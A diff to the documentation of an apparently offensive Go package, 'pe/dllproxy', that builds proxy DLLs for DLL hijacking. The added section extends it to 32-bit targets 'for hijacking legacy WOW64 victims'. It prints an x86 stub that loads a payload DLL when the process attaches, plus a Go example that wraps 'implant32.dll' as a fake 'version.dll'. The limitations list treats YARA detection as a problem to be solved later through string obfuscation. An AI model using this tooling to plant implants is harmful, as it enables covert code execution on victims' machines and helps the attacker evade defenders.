@@ -128,8 +128,8 @@ Sentinel errors (use `errors.Is`):
 var (
     ErrEmptyExports     // no exports supplied
     ErrEmptyTargetName  // blank target name
-    ErrInvalidExport    // entry has neither name nor ordinal, or duplicate ordinals
-    ErrI386NotSupported // 32-bit not yet implemented
+    ErrInvalidExport      // entry has neither name nor ordinal, or duplicate ordinals
+    ErrUnsupportedMachine // Options.Machine is something other than AMD64 or I386
 )
 ```
 
@@ -168,6 +168,32 @@ for _, opp := range opps {
 
     _ = os.WriteFile(opp.HijackedPath, proxy, 0o644)
 }
+```
+
+### 32-bit targets (`MachineI386`)
+
+Setting `Options.Machine = dllproxy.MachineI386` switches the emitter to PE32 output for hijacking legacy WOW64 victims. The forwarder-only path produces a 224-byte optional header (vs 240 for PE32+), `IMAGE_FILE_32BIT_MACHINE` in the COFF flags, ImageBase 0x10000000, and a 32-bit `BaseOfData`.
+
+The Phase 2 payload-load path swaps the AMD64 stub for a 28-byte x86 stdcall stub:
+
+```text
+mov eax, [esp+8]              ; reason
+cmp eax, 1                    ; DLL_PROCESS_ATTACH
+jne ret_true
+push <payload_str_abs>
+call dword ptr [<iat_abs>]
+ret_true:
+mov eax, 1
+ret 0Ch                       ; stdcall: pop 3*4 bytes of args
+```
+
+x86 has no RIP-relative addressing, so the stub embeds absolute virtual addresses (ImageBase + RVA). The emitter keeps `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` off, so the loader honours the embedded ImageBase and the absolutes resolve correctly.
+
+```go
+out, err := dllproxy.Generate("version.dll", exports, dllproxy.Options{
+    Machine:    dllproxy.MachineI386,
+    PayloadDLL: "implant32.dll",
+})
 ```
 
 ### Mixed named + ordinal-only exports
@@ -260,7 +286,6 @@ proxy, err := dllproxy.Generate(
 
 ## Limitations
 
-- **AMD64 only**. 32-bit (PE32) emission is queued — different optional-header size (224 vs 240), no `LARGE_ADDRESS_AWARE`, ImageBase 0x10000000.
 - **COM-private semantics**. The MSVC `,PRIVATE` linker directive only excludes a symbol from the import library so downstream `.lib`-based linkers ignore it; at runtime the export is binary-identical to a regular named export. `pe/dllproxy` does not need a separate code path — pass `DllRegisterServer` & friends as ordinary `Export{Name: …}` entries.
 - **No CheckSum / no DOS stub**. Windows tolerates both; signed DLLs would need a recomputed checksum, which is out of scope (use `pe/cert` if signing is in play).
 - **Forwarder paths are plaintext** in `.rdata` — easy YARA target. String obfuscation is a Phase 2 candidate.
